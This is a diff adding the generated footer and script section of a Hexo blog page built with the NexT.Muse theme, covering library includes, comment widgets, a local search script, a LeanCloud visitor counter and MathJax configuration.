+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
